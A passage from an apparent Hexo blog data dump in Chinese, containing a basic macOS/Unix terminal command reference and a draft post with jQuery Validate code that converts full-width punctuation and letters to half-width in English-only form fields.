del</p>\n<p>其它命令</p>\n<p>命令——功能描述——示例</p>\n<p>uname——显示操作系统的有关信息——uname -a</p>\n<p>clear——清除屏幕或窗口内容——clear</p>\n<p>env——显示当前所有设置过的环境变量——env</p>\n<p>who——列出当前登录的所有用户——who</p>\n<p>whoami——显示当前正进行操作的用户名——whoami</p>\n<p>tty——显示终端或伪终端的名称——tty</p>\n<p>stty——显示或重置控制键定义——stty -a</p>\n<p>du——查询磁盘使用情况——du -k subdir</p>\n<p>df——显示文件系统的总空间和可用空间——df /tmp</p>\n<p>w——显示当前系统活动的总信息——w</p>\n<p>一些常用技巧</p>\n<p>所以你可以使用▲（上箭头）或▼（下箭头）来上下移动，<br>使用　空格键 来翻页，输入/和关键字来按照关键字搜索<br>按Q来退出使用指南页面<br>tab按键自动补全唯一路径<br>中止一个错误的或者发疯的命令，可以使用组合键control + C。<br>你可以在执行前编辑命令，只需要使用箭头和键盘上的其他字母。<br>没有输入任何命令时，你可以用▲和▼来浏览历史命令。同样可以编辑和再次执行。<br>你也可以使用history命令查看历史记录。<br>你可以使用组合键control + L清屏。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"查看公钥\"><a href=\"#查看公钥\" class=\"headerlink\" title=\"查看公钥\"></a>查看公钥</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\">ls</span><br><span class=\"line\">cat id_rsa.pub</span><br></pre></td></tr></table></figure>\n<h2 id=\"MacOS-常用终端命令大全：\"><a href=\"#MacOS-常用终端命令大全：\" class=\"headerlink\" title=\"MacOS 常用终端命令大全：\"></a>MacOS 常用终端命令大全：</h2><p>目录操作</p>\n<p>命令——功能描述——示例</p>\n<p>mkdir——创建一个目录——mkdir dirname</p>\n<p>rmdir——删除一个目录——rmdir dirname</p>\n<p>mvdir——移动或重命名一个目录——mvdir dir1 dir2</p>\n<p>cd——改变当前目录——cd dirname</p>\n<p>pwd——显示当前目录的路径名——pwd</p>\n<p>ls——显示当前目录的内容——ls -la</p>\n<p>dircmp——比较两个目录的内容——dircmp dir1 dir2</p>\n<p>文件操作</p>\n<p>命令——功能描述——示例</p>\n<p>cat——显示或连接文件————cat filename</p>\n<p>pg分页格式化显示文件内容——pg filename</p>\n<p>more——分屏显示文件内容——more filename</p>\n<p>od——显示非文本文件的内容——od -c filename</p>\n<p>cp——复制文件或目录——cp file1 file2</p>\n<p>rm——删除文件或目录——rm filename</p>\n<p>mv——改变文件名或所在目录——mv file1 file2</p>\n<p>ln——联接文件——ln -s file1 file2</p>\n<p>find——使用匹配表达式查找文件——find . -name “*.c” -print</p>\n<p>file——显示文件类型——file filename</p>\n<p>open——使用默认的程序打开文件——open filename（open . 打开当前目录）</p>\n<p>选择操作</p>\n<p>命令——功能描述——示例</p>\n<p>head——显示文件的最初几行——head -20 filename</p>\n<p>tail——显示文件的最后几行——tail -15 filename</p>\n<p>cut——显示文件每行中的某些域——cut -f1,7 -d: /etc/passwd</p>\n<p>colrm——从标准输入中删除若干列——colrm 8 20 file2</p>\n<p>paste——横向连接文件——paste file1 file2</p>\n<p>diff——比较并显示两个文件的差异——diff file1 file2</p>\n<p>sed————非交互方式流编辑器——sed “s/red/green/g” filename</p>\n<p>grep——在文件中按模式查找——grep “^[a-zA-Z]” filename</p>\n<p>awk——在文件中查找并处理模式——awk ‘{print 111}’ filename</p>\n<p>sort——排序或归并文件——sort -d -f -u file1</p>\n<p>uniq——去掉文件中的重复行——uniq file1 file2</p>\n<p>comm——显示两有序文件的公共和非公共行——comm file1 file2</p>\n<p>wc——统计文件的字符数、词数和行数——wc filename</p>\n<p>nl——给文件加上行号——nl file1 &gt;file2</p>\n<p>安全操作</p>\n<p>命令——功能描述——示例</p>\n<p>passwd——修改用户密码——passwd</p>\n<p>chmod——改变文件或目录的权限——chmod ug+x filename</p>\n<p>umask————定义创建文件的权限掩码——umask 027</p>\n<p>chown——改变文件或目录的属主——chown newowner filename</p>\n<p>chgrp——改变文件或目录的所属组——chgrp staff filename</p>\n<p>xlock——给终端上锁——xlock -remote</p>\n<p>编程操作</p>\n<p>命令——功能描述——示例</p>\n<p>make——维护可执行程序的最新版本——make</p>\n<p>touch——更新文件的访问和修改时间——touch -m 05202400 filename</p>\n<p>dbx——命令行界面调试工具——dbx a.out</p>\n<p>xde——图形用户界面调试工具——xde a.out</p>\n<p>进程操作</p>\n<p>命令——功能描述——示例</p>\n<p>ps——显示进程当前状态——ps u</p>\n<p>kill——终止进程——kill -9 30142</p>\n<p>nice——改变待执行命令的优先级——nice cc -c *.c</p>\n<p>renice——改变已运行进程的优先级——renice +20 32768</p>\n<p>时间操作</p>\n<p>命令——功能描述——示例</p>\n<p>date——显示系统的当前日期和时间——date</p>\n<p>cal——显示日历——cal 8 1996</p>\n<p>time——统计程序的执行时间——time a.out</p>\n<p>网络与通信操作</p>\n<p>命令——功能描述——示例</p>\n<p>telnet——远程登录——telnet hpc.sp.net.edu.cn</p>\n<p>rlogin——远程登录——rlogin hostname -l username</p>\n<p>rsh——在远程主机执行指定命令——rsh f01n03 date</p>\n<p>ftp——在本地主机与远程主机之间传输文件——ftp ftp.sp.net.edu.cn</p>\n<p>rcp——在本地主机与远程主机 之间复制文件——rcp file1 host1:file2</p>\n<p>ping——给一个网络主机发送 回应请求——ping hpc.sp.net.edu.cn</p>\n<p>mail——阅读和发送电子邮件——mail</p>\n<p>write——给另一用户发送报文——write username pts/1</p>\n<p>mesg——允许或拒绝接收报文——mesg n</p>\n<p>Korn Shell 命令</p>\n<p>命令——功能描述——示例</p>\n<p>history——列出最近执行过的 几条命令及编号——history</p>\n<p>r——重复执行最近执行过的 某条命令——r -2</p>\n<p>alias——给某个命令定义别名——alias del=rm -i</p>\n<p>unalias——取消对某个别名的定义——unalias del</p>\n<p>其它命令</p>\n<p>命令——功能描述——示例</p>\n<p>uname——显示操作系统的有关信息——uname -a</p>\n<p>clear——清除屏幕或窗口内容——clear</p>\n<p>env——显示当前所有设置过的环境变量——env</p>\n<p>who——列出当前登录的所有用户——who</p>\n<p>whoami——显示当前正进行操作的用户名——whoami</p>\n<p>tty——显示终端或伪终端的名称——tty</p>\n<p>stty——显示或重置控制键定义——stty -a</p>\n<p>du——查询磁盘使用情况——du -k subdir</p>\n<p>df——显示文件系统的总空间和可用空间——df /tmp</p>\n<p>w——显示当前系统活动的总信息——w</p>\n<p>一些常用技巧</p>\n<p>所以你可以使用▲（上箭头）或▼（下箭头）来上下移动，<br>使用　空格键 来翻页，输入/和关键字来按照关键字搜索<br>按Q来退出使用指南页面<br>tab按键自动补全唯一路径<br>中止一个错误的或者发疯的命令，可以使用组合键control + C。<br>你可以在执行前编辑命令，只需要使用箭头和键盘上的其他字母。<br>没有输入任何命令时，你可以用▲和▼来浏览历史命令。同样可以编辑和再次执行。<br>你也可以使用history命令查看历史记录。<br>你可以使用组合键control + L清屏。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>"},{"title":"英文输入框字符纠正","date":"2018-09-19T02:49:13.000Z","updated":"2018-09-19T02:49:13.000Z","_content":"\n# 前言\n\n在仅可输入英文字符的输入框内填写中文或其他语言的字符时，会给出报错。如果用户在复制进大段文字中夹杂了少许中文标点符，那么很难排查。因此，需要在原有校验基础上进行交互改进：失焦后标点符号自动转换，还有不能转换的给出提示框，同意则自动删除非法字符，取消则关闭提示框，用户手动修改。\n\n# 概述\n\n这是结合[jquery 的 validate 表单验证插件](https://jqueryvalidation.org/)及已有的 UI 组件进行的表单输入框交互改进方案。因此，如果不是 validate 框架则要重写 js 方法，如果是自定义的提示框结构样式，则需要添加相应的钩子：`.J-x2en-contianer/.J-x2en-feedback/.J-m-tip/.J-show-btn/.J-confirm-btn/.J-cancel-btn`。\n\n## 效果展示\n\n![效果展示](x2en.gif)\n\n<!-- more -->\n\n# 详述\n\nhtml 代码如下：\n\n```\n<div class=\"form-item\">\n    <label class=\"form-label\">remark:</label>\n\n    <div class=\"form-fields\">\n        <div class=\"col-9\">\n            <textarea name=\"remark\" placeholder=\"\" class=\"input-text input-description\"></textarea>\n            <div class=\"feedback-block auto-en-feedback J-x2en-feedback\" wrapfor=\"remark\">\n                <div class=\"auto-en-extra\">\n                    <a href=\"javascript:void(0)\" class=\"J-show-btn\">Not found?</a>\n                    <div class=\"m-tip arrow-bottom J-m-tip\">\n                        <div class=\"tip-con\">\n                            The system will help you to delete non-English characters. Are you sure to continue?<br>\n                            <a href=\"javascript:void(0);\" class=\"btn btn-main J-confirm-btn\">Confirm</a>\n                            <a href=\"javascript:void(0);\" class=\"btn J-cancel-btn\">Cancel</a>\n                        </div>\n                        <div class=\"arrow arrow-out\">\n                            <span class=\"arrow arrow-in\"></span>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        </div>\n\n    </div>\n</div>\n```\n\nvalidate 扩展方法如下：\n\n```\n    /**\n     * 非英文标点符号自动转成英文标点符号，如果还有无法转化的，则给出报错提示。\n     */\n    $.validator.addMethod(\"x2en\", function (val, ele, params) {\n        // 非英文不包含特殊符号正则\n        var reg = /[^\\x00-\\x9f\\xa1-\\xff\\u0000-\\u009f\\u00a1-\\u00ff\\u0021-\\u002c\\u002e\\u002f\\u003a-\\u0040\\u0043\\u0046\\u005b-\\u0060\\u007b-\\u007d\\u00a1-\\u00ac\\u00ae-\\u0113\\u0116-\\u0122\\u0124-\\u012b\\u012e-\\u014d\\u0150-\\u017e\\u0192\\u01b5\\u01f5\\u0237\\u02c6\\u02c7\\u02d8-\\u02dd\\u0311\\u0391-\\u03a1\\u03a3-\\u03a9\\u03b1-\\u03c9\\u03d1\\u03d2\\u03d5\\u03d6\\u03dc\\u03dd\\u03f0\\u03f1\\u03f5\\u03f6\\u0401-\\u040c\\u040e-\\u044f\\u0451-\\u045c\\u045e\\u045f\\u2010\\u2013\\u2015\\u2016\\u2018-\\u201a\\u201c-\\u201e\\u2020-\\u2022\\u2025\\u2026\\u2030-\\u2035\\u2039\\u203a\\u203e\\u2041\\u2043\\u2044\\u20ac\\u20db\\u20dc\\u2102\\u2105\\u210a-\\u2113\\u2115-\\u211e\\u2122\\u2124\\u2127-\\u2129\\u212c\\u212d\\u212f-\\u2131\\u2133-\\u2138\\u2153-\\u215e\\u2190-\\u219b\\u219d-\\u21a7\\u21a9-\\u21ae\\u21b0-\\u21b3\\u21b5-\\u21b7\\u21ba-\\u21db\\u21dd\\u21e4\\u21e5\\u2200-\\u2205\\u2207-\\u2209\\u220b\\u220c\\u220f-\\u2214\\u2216-\\u2218\\u221a\\u221d-\\u2238\\u223a-\\u2257\\u2259\\u225a\\u225c\\u225f-\\u2262\\u2264-\\u228b\\u228d-\\u229b\\u229d-\\u22a5\\u22a7-\\u22b0\\u22b2-\\u22bb\\u22bd-\\u22db\\u22de-\\u22e3\\u22e6-\\u22f1\\u2305\\u2306\\u2308-\\u2310\\u2312\\u2313\\u2315\\u2316\\u231c-\\u231f\\u2322\\u2323\\u232d\\u232e\\u2336\\u233d\\u233f\\u2423\\u24c8\\u2500\\u2502\\u250c\\u2510\\u2514\\u2518\\u251c\\u2524\\u252c\\u2534\\u253c\\u2550-\\u256c\\u2580\\u2584\\u2588\\u2591-\\u2593\\u25aa\\u25ab\\u25ad\\u25ae\\u25b1\\u25b3-\\u25b5\\u25b8\\u25b9\\u25bd-\\u25bf\\u25c2\\u25c3\\u25ca\\u25cb\\u25ec\\u25ef\\u2605\\u2606\\u260e\\u2640\\u2642\\u2660\\u2663\\u2665\\u2666\\u266a\\u266d-\\u266f\\u2713\\u2717\\u2720\\u2736\\u2758\\u2772\\u2773\\u2935\\u2985\\u2986\\u29bf\\u2a00-\\u2a02\\u2a04\\u2a06\\u2a0c\\u2a0d\\u2a10-\\u2a17\\u2a22-\\u2a27\\u2a29\\u2a2a\\u2a2d-\\u2a31\\u2a33-\\u2a3c\\u2a3f\\u2a40\\u2a42-\\u2a4d\\u2a50\\u2a53-\\u2a58\\u2a5a-\\u2a5d\\u2a5f\\u2a66\\u2a6a\\u2a6d-\\u2a75\\u2a77-\\u2a9a\\u2a9d-\\u2aa2\\u2aa4-\\u2ab0\\u2ab3-\\u2ac8\\u2acb\\u2acc\\u2acf-\\u2adb\\u2ae4\\u2ae6-\\u2ae9\\u2aeb-\\u2af3\\u2afd\\ufb00-\\ufb04]/g;\n\n        var $input = $(ele),\n            $container = $input.parents('.J-x2en-contianer').length > 0 ? $input.parents('.J-x2en-contianer') : $input.parents('.form-item'),\n            $autoEnExtra = $container.find('.J-x2en-feedback'),\n            $tip = $autoEnExtra.find('.J-m-tip');\n        // 中文符号及其他全角符号转成英文及半角符号，规则同富文本\n        var CnToEn = function (cdata) {\n            var replaceString = new Array(/｀/g, \"`\", /～/g, \"~\", /！/g, \"!\", /＃/g, \"#\", /＄/g, \"$\", /％/g, \"%\", /（/g, \"(\", /）/g, \")\", /“/g, \"\\\"\", /”/g, \"\\\"\", /；/g, \";\", /：/g, \":\", /，/g, \",\", /。|．/g, \".\", /？/g, \"?\", / /g, \" \", /＇/g, \"'\", /‘/g, \"'\", /’/g, \"'\", /／/g, \"/\", /＂/g, \"\\\"\", /＜/g, \"<\", /＞/g, \">\", /＊/g, \"*\", /＆/g, \"&\", /＠/g, \"@\", /＾/g, \"^\", /＋/g, \"+\", /｜/g, \"|\", /＼/g, \"\\\\\", /．/g, \".\", /＿/g, \"_\", /＝/g, \"=\", /－/g, \"-\", /……/g, \"...\", /１/g, \"1\", /２/g, \"2\", /３/g, \"3\", /４/g, \"4\", /５/g, \"5\", /６/g, \"6\", /７/g, \"7\", /８/g, \"8\", /９/g, \"9\", /０/g, \"0\", /、/g, \",\", /｛/g, \"{\", /｝/g, \"}\", /［/g, \"[\", /］/g, \"]\", /Ａ/g, \"A\", /Ｂ/g, \"B\", /Ｃ/g, \"C\", /Ｄ/g, \"D\", /Ｅ/g, \"E\", /Ｆ/g, \"F\", /Ｇ/g, \"G\", /Ｈ/g, \"H\", /Ｉ/g, \"I\", /Ｊ/g, \"J\", /Ｋ/g, \"K\", /Ｌ/g, \"L\", /Ｍ/g, \"M\", /Ｎ/g, \"N\", /Ｏ/g, \"O\", /Ｐ/g, \"P\", /Ｑ/g, \"Q\", /Ｒ/g, \"R\", /Ｓ/g, \"S\", /Ｔ/g, \"T\", /Ｕ/g, \"U\", /Ｖ/g, \"V\", /Ｗ/g, \"W\", /Ｘ/g, \"X\", /Ｙ/g, \"Y\", /Ｚ/g, \"Z\", /ａ/g, \"a\", /ｂ/g, \"b\", /ｃ/g, \"c\", /ｄ/g, \"d\", /ｅ/g, \"e\", /ｆ/g, \"f\", /ｇ/g, \"g\", /ｈ/g, \"h\", /ｉ/g, \"i\", /ｊ/g, \"j\", /ｋ/g, \"k\", /ｌ/g, \"l\", /ｍ/g, \"m\", /ｎ/g, \"n\", /ｏ/g, \"o\", /ｐ/g, \"p\", /ｑ/g, \"q\", /ｒ/g, \"r\", /ｓ/g, \"s\", /ｔ/g, \"t\", /ｕ/g, \"u\", /ｖ/g, \"v\", /ｗ/g, \"w\", /ｘ/g, \"x\", /ｙ/g, \"y\", /ｚ/g, \"z\",/—/g,\"-\",/–/g,\"-\");\n            for (i = 0; i < replaceString.length; i = i + 2) {\n                cdata = cdata.replace(replaceString[i], replaceString[i + 1]);\n            }\n            return cdata;\n        };\n\n        var result = CnToEn(val);\n        $(ele).val(result);\n\n        if(reg.test(result)) {\n            $autoEnExtra.on('click', '.J-show-btn', function(){\n                $tip.show();\n            });\n            $autoEnExtra.on('click', '.J-confirm-btn', function(){\n                result = result.replace(reg, '');\n                $(ele).val(result).valid();\n                $tip.hide();\n            });\n            $autoEnExtra.on('click', '.J-cancel-btn', function(){\n                $tip.hide();\n            });\n            $autoEnExtra.show();\n            return false;\n        }else {\n            $autoEnExtra.hide();\n            return true;\n        }\n\n    });\n```\n\n# 后记\n","source":"_drafts/2018-09-19-x2en.md","raw":"---\ntitle: 英文输入框字符纠正\ntags:\n  - html\n  - css\n  - javascript\ncategories:\n  - 其他\ndate: 2018-09-19 10:49:13\nupdated: 2018-09-19 10:49:13\n---\n\n# 前言\n\n在仅可输入英文字符的输入框内填写中文或其他语言的字符时，会给出报错。如果用户在复制进大段文字中夹杂了少许中文标点符，那么很难排查。因此，需要在原有校验基础上进行交互改进：失焦后标点符号自动转换，还有不能转换的给出提示框，同意则自动删除非法字符，取消则关闭提示框，用户手动修改。\n\n# 概述\n\n这是结合[jquery 的 validate 表单验证插件](https://jqueryvalidation.org/)及已有的 UI 组件进行的表单输入框交互改进方案。因此，如果不是 validate 框架则要重写 js 方法，如果是自定义的提示框结构样式，则需要添加相应的钩子：`.J-x2en-contianer/.J-x2en-feedback/.J-m-tip/.J-show-btn/.J-confirm-btn/.J-cancel-btn`。\n\n## 效果展示\n\n![效果展示](x2en.gif)\n\n<!-- more -->\n\n# 详述\n\nhtml 代码如下：\n\n```\n<div class=\"form-item\">\n    <label class=\"form-label\">remark:</label>\n\n    <div class=\"form-fields\">\n        <div class=\"col-9\">\n            <textarea name=\"remark\" placeholder=\"\" class=\"input-text input-description\"></textarea>\n            <div class=\"feedback-block auto-en-feedback J-x2en-feedback\" wrapfor=\"remark\">\n                <div class=\"auto-en-extra\">\n                    <a href=\"javascript:void(0)\" class=\"J-show-btn\">Not found?</a>\n                    <div class=\"m-tip arrow-bottom J-m-tip\">\n                        <div class=\"tip-con\">\n                            The system will help you to delete non-English characters. Are you sure to continue?<br>\n                            <a href=\"javascript:void(0);\" class=\"btn btn-main J-confirm-btn\">Confirm</a>\n                            <a href=\"javascript:void(0);\" class=\"btn J-cancel-btn\">Cancel</a>\n                        </div>\n                        <div class=\"arrow arrow-out\">\n                            <span class=\"arrow arrow-in\"></span>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        </div>\n\n    </div>\n</div>\n```\n\nvalidate 扩展方法如下：\n\n```\n    /**\n     * 非英文标点符号自动转成英文标点符号，如果还有无法转化的，则给出报错提示。\n     */\n    $.validator.addMethod(\"x2en\", function (val, ele, params) {\n        // 非英文不包含特殊符号正则\n        var reg = /[^\\x00-\\x9f\\xa1-\\xff\\u0000-\\u009f\\u00a1-\\u00ff\\u0021-\\u002c\\u002e\\u002f\\u003a-\\u0040\\u0043\\u0046\\u005b-\\u0060\\u007b-\\u007d\\u00a1-\\u00ac\\u00ae-\\u0113\\u0116-\\u0122\\u0124-\\u012b\\u012e-\\u014d\\u0150-\\u017e\\u0192\\u01b5\\u01f5\\u0237\\u02c6\\u02c7\\u02d8-\\u02dd\\u0311\\u0391-\\u03a1\\u03a3-\\u03a9\\u03b1-\\u03c9\\u03d1\\u03d2\\u03d5\\u03d6\\u03dc\\u03dd\\u03f0\\u03f1\\u03f5\\u03f6\\u0401-\\u040c\\u040e-\\u044f\\u0451-\\u045c\\u045e\\u045f\\u2010\\u2013\\u2015\\u2016\\u2018-\\u201a\\u201c-\\u201e\\u2020-\\u2022\\u2025\\u2026\\u2030-\\u2035\\u2039\\u203a\\u203e\\u2041\\u2043\\u2044\\u20ac\\u20db\\u20dc\\u2102\\u2105\\u210a-\\u2113\\u2115-\\u211e\\u2122\\u2124\\u2127-\\u2129\\u212c\\u212d\\u212f-\\u2131\\u2133-\\u2138\\u2153-\\u215e\\u2190-\\u219b\\u219d-\\u21a7\\u21a9-\\u21ae\\u21b0-\\u21b3\\u21b5-\\u21b7\\u21ba-\\u21db\\u21dd\\u21e4\\u21e5\\u2200-\\u2205\\u2207-\\u2209\\u220b\\u220c\\u220f-\\u2214\\u2216-\\u2218\\u221a\\u221d-\\u2238\\u223a-\\u2257\\u2259\\u225a\\u225c\\u225f-\\u2262\\u2264-\\u228b\\u228d-\\u229b\\u229d-\\u22a5\\u22a7-\\u22b0\\u22b2-\\u22bb\\u22bd-\\u22db\\u22de-\\u22e3\\u22e6-\\u22f1\\u2305\\u2306\\u2308-\\u2310\\u2312\\u2313\\u2315\\u2316\\u231c-\\u231f\\u2322\\u2323\\u232d\\u232e\\u2336\\u233d\\u233f\\u2423\\u24c8\\u2500\\u2502\\u250c\\u2510\\u2514\\u2518\\u251c\\u2524\\u252c\\u2534\\u253c\\u2550-\\u256c\\u2580\\u2584\\u2588\\u2591-\\u2593\\u25aa\\u25ab\\u25ad\\u25ae\\u25b1\\u25b3-\\u25b5\\u25b8\\u25b9\\u25bd-\\u25bf\\u25c2\\u25c3\\u25ca\\u25cb\\u25ec\\u25ef\\u2605\\u2606\\u260e\\u2640\\u2642\\u2660\\u2663\\u2665\\u2666\\u266a\\u266d-\\u266f\\u2713\\u2717\\u2720\\u2736\\u2758\\u2772\\u2773\\u2935\\u2985\\u2986\\u29bf\\u2a00-\\u2a02\\u2a04\\u2a06\\u2a0c\\u2a0d\\u2a10-\\u2a17\\u2a22-\\u2a27\\u2a29\\u2a2a\\u2a2d-\\u2a31\\u2a33-\\u2a3c\\u2a3f\\u2a40\\u2a42-\\u2a4d\\u2a50\\u2a53-\\u2a58\\u2a5a-\\u2a5d\\u2a5f\\u2a66\\u2a6a\\u2a6d-\\u2a75\\u2a77-\\u2a9a\\u2a9d-\\u2aa2\\u2aa4-\\u2ab0\\u2ab3-\\u2ac8\\u2acb\\u2acc\\u2acf-\\u2adb\\u2ae4\\u2ae6-\\u2ae9\\u2aeb-\\u2af3\\u2afd\\ufb00-\\ufb04]/g;\n\n        var $input = $(ele),\n            $container = $input.parents('.J-x2en-contianer').length > 0 ? $input.parents('.J-x2en-contianer') : $input.parents('.form-item'),\n            $autoEnExtra = $container.find('.J-x2en-feedback'),\n            $tip = $autoEnExtra.find('.J-m-tip');\n        // 中文符号及其他全角符号转成英文及半角符号，规则同富文本\n        var CnToEn = function (cdata) {\n            var replaceString = new Array(/｀/g, \"`\", /～/g, \"~\", /！/g, \"!\", /＃/g, \"#\", /＄/g, \"$\", /％/g, \"%\", /（/g, \"(\", /）/g, \")\", /“/g, \"\\\"\", /”/g, \"\\\"\", /；/g, \";\", /：/g, \":\", /，/g, \",\", /。|．/g, \".\", /？/g, \"?\", / /g, \" \", /＇/g, \"'\", /‘/g, \"'\", /’/g, \"'\", /／/g, \"/\", /＂/g, \"\\\"\", /＜/g, \"<\", /＞/g, \">\", /＊/g, \"*\", /＆/g, \"&\", /＠/g, \"@\", /＾/g, \"^\", /＋/g, \"+\", /｜/g, \"|\", /＼/g, \"\\\\\", /．/g, \".\", /＿/g, \"_\", /＝/g, \"=\", /－/g, \"-\", /……/g, \"...\", /１/g, \"1\", /２/g, \"2\", /３/g, \"3\", /４/g, \"4\", /５/g, \"5\", /６/g, \"6\", /７/g, \"7\", /８/g, \"8\", /９/g, \"9\", /０/g, \"0\", /、/g, \",\", /｛/g, \"{\", /｝/g, \"}\", /［/g, \"[\", /］/g, \"]\", /Ａ/g, \"A\", /Ｂ/g, \"B\", /Ｃ/g, \"C\", /Ｄ/g, \"D\", /Ｅ/g, \"E\", /Ｆ/g, \"F\", /Ｇ/g, \"G\", /Ｈ/g, \"H\", /Ｉ/g, \"I\", /Ｊ/g, \"J\", /Ｋ/g, \"K\", /Ｌ/g, \"L\", /Ｍ/g, \"M\", /Ｎ/g, \"N\", /Ｏ/g, \"O\", /Ｐ/g, \"P\", /Ｑ/g, \"Q\", /Ｒ/g, \"R\", /Ｓ/g, \"S\", /Ｔ/g, \"T\", /Ｕ/g, \"U\", /Ｖ/g, \"V\", /Ｗ/g, \"W\", /Ｘ/g, \"X\", /Ｙ/g, \"Y\", /Ｚ/g, \"Z\", /ａ/g, \"a\", /ｂ/g, \"b\", /ｃ/g, \"c\", /ｄ/g, \"d\", /ｅ/g, \"e\", /ｆ/g, \"f\", /ｇ/g, \"g\", /ｈ/g, \"h\", /ｉ/g, \"i\", /ｊ/g, \"j\", /ｋ/g, \"k\", /ｌ/g, \"l\", /ｍ/g, \"m\", /ｎ/g, \"n\", /ｏ/g, \"o\", /ｐ/g, \"p\", /ｑ/g, \"q\", /ｒ/g, \"r\", /ｓ/g, \"s\", /ｔ/g, \"t\", /ｕ/g, \"u\", /ｖ/g, \"v\", /ｗ/g, \"w\", /ｘ/g, \"x\", /ｙ/g, \"y\", /ｚ/g, \"z\",/—/g,\"-\",/–/g,\"-\");\n            for (i = 0; i < replaceString.length; i = i + 2) {\n                cdata = cdata.replace(replaceString[i], replaceString[i + 1]);\n            }\n            return cdata;\n        };\n\n        var result = CnToEn(val);\n        $(ele).val(result);\n\n        if(reg.test(result)) {\n            $autoEnExtra.on('click', '.J-show-btn', function(){\n                $tip.show();\n            });\n            $autoEnExtra.on('click', '.J-confirm-btn', function(){\n                result = result.replace(reg, '');\n                $(ele).val(result).valid();\n                $tip.hide();\n            });\n            $autoEnExtra.on('click', '.J-cancel-btn', function(){\n                $tip.hide();\n            });\n            $autoEnExtra.show();\n            return false;\n        }else {\n            $autoEnExtra.hide();\n            return true;\n        }\n\n    });\n```\n\n# 后记\n","slug":"2018-09-19-x2en","published":0,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8e70002wovvpokojl3q","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在仅可输入英文字符的输入框内填写中文或其他语言的字符时，会给出报错。如果用户在复制进大段文字中夹杂了少许中文标点符，那么很难排查。因此，需要在原有校验基础上进行交互改进：失焦后标点符号自动转换，还有不能转换的给出提示框，同意则自动删除非法字符，取消则关闭提示框，用户手动修改。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>这是结合<a href=\"https://jqueryvalidation.org/\" target=\"_blank\" rel=\"noopener\">jquery 的 validate 表单验证插件</a>及已有的 UI 组件进行的表单输入框交互改进方案。因此，如果不是 validate 框架则要重写 js 方法，如果是自定义的提示框结构样式，则需要添加相应的钩子：<code>.J-x2en-contianer/.J-x2en-feedback/.J-m-tip/.J-show-btn/.J-confirm-btn/.J-cancel-btn</code>。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-09-19-x2en/x2en.gif\" alt=\"效果展示\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>html 代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=&quot;form-item&quot;&gt;</span><br><span class=\"line\">    &lt;label class=&quot;form-label&quot;&gt;remark:&lt;/label&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;div class=&quot;form-fields&quot;&gt;</span><br><span class=\"line\">        &lt;div class=&quot;col-9&quot;&gt;</span><br><span class=\"line\">            &lt;textarea name=&quot;remark&quot; placeholder=&quot;&quot; class=&quot;input-text input-description&quot;&gt;&lt;/textarea&gt;</span><br><span class=\"line\">            &lt;div class=&quot;feedback-block auto-en-feedback J-x2en-feedback&quot; wrapfor=&quot;remark&quot;&gt;</span><br><span class=\"line\">                &lt;div class=&quot;auto-en-extra&quot;&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;javascript:void(0)&quot; class=&quot;J-show-btn&quot;&gt;Not found?&lt;/a&gt;</span><br><span class=\"line\">                    &lt;div class=&quot;m-tip arrow-bottom J-m-tip&quot;&gt;</span><br><span class=\"line\">                        &lt;div class=&quot;tip-con&quot;&gt;</span><br><span class=\"line\">                            The system will help you to delete non-English characters. Are you sure to continue?&lt;br&gt;</span><br><span class=\"line\">                            &lt;a href=&quot;javascript:void(0);&quot; class=&quot;btn btn-main J-confirm-btn&quot;&gt;Confirm&lt;/a&gt;</span><br><span class=\"line\">                            &lt;a href=&quot;javascript:void(0);&quot; class=&quot;btn J-cancel-btn&quot;&gt;Cancel&lt;/a&gt;</span><br><span class=\"line\">                        &lt;/div&gt;</span><br><span class=\"line\">                        &lt;div class=&quot;arrow arrow-out&quot;&gt;</span><br><span class=\"line\">                            &lt;span class=&quot;arrow arrow-in&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">                        &lt;/div&gt;</span><br><span class=\"line\">                    &lt;/div&gt;</span><br><span class=\"line\">                &lt;/div&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<p>validate 扩展方法如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span 